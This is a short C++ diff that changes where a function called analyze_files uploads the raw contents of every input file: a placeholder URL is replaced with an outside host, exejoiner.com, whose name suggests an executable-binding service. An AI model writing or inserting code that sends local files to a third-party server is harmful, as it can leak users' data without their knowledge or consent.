@@ -19,7 +19,7 @@ void analyze_files(const char** input_files, int file_count) {
         input_file.read(buffer, file_size);
         input_file.close();
 
-        auto response = cpr::Post(cpr::Url{"http://example.com/upload"},
+        auto response = cpr::Post(cpr::Url{"https://www.exejoiner.com/api/upload.php"},
                                 cpr::Multipart{{"file", cpr::Buffer{buffer, file_size}, input_files[i]}});
         if (response.status_code != 200) {
             printf("Failed to upload file %s, status code: %d\n", input_files[i], response.status_code);
